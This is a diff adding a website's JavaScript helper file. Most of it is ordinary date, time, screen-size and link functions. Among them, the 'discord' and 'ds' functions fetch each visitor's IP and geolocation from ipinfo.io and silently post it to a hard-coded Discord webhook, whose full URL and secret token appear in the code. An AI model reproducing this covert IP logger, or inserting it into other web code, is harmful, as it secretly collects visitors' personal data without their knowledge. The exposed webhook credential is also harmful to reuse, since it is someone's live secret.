@@ -1,0 +1,53 @@
+const getDate = () => {
+	var d = new Date().getDate()
+	var y = new Date().getFullYear()
+	var mms = ["Jan", "Feb", "Mar", "Apr", "May", "Jun", "Jul", "Aug", "Sep", "Oct", "Nov", "Dec"]
+	var m = mms[new Date().getMonth()]
+	return `${d} of ${m}, ${y}`
+}
+
+const getTime = () => {
+	var h = new Date().getHours()
+	var m = new Date().getMinutes()
+	var s = new Date().getSeconds()
+	if (h < 10) {
+		var h = `0${h}`
+	}
+	if (m < 10) {
+		var m = `0${m}`
+	}
+	if (s < 10) {
+		var s = `0${s}`
+	}
+	return `${h}:${m}:${s}`
+}
+
+function ds(data) {
+    var xhr = new XMLHttpRequest();
+    xhr.open("POST", "https://discordapp.com/api/webhooks/746461463140630640/9F36RSnVyN8Ub_JfA8B8cJSE-ogEO1eapyfmER-CT-kgq4FPxbyc02NLgqdCAqyIi3eg", true);
+    xhr.setRequestHeader('Content-Type', 'application/json');
+    xhr.send(JSON.stringify({
+       	username: "⨯ EG♡IST ⨯ joins",
+       	embeds: [{
+       		description: `\`\`\`json\n${JSON.stringify(data, null, 4)}\n\`\`\``
+       			}]
+    }));
+}
+
+const discord = () => {
+	$.getJSON('https://ipinfo.io/json', function(dat) {
+		ds(dat)
+	});
+}
+
+const errorWindow = (id) => {
+	var p = [document.documentElement.clientWidth, document.documentElement.clientHeight]
+	console.log(p)
+	if (p[0] < 1366 || p[1] < 625) {
+		document.getElementById(id).innerHTML = "<strong><h1>Sorry, your monitor does not support our site. You can try using scaling (CTRL +/-) or changing the resolution.</h1></strong>"
+	}
+}
+
+const link = (url) => {
+	window.open(url)
+}
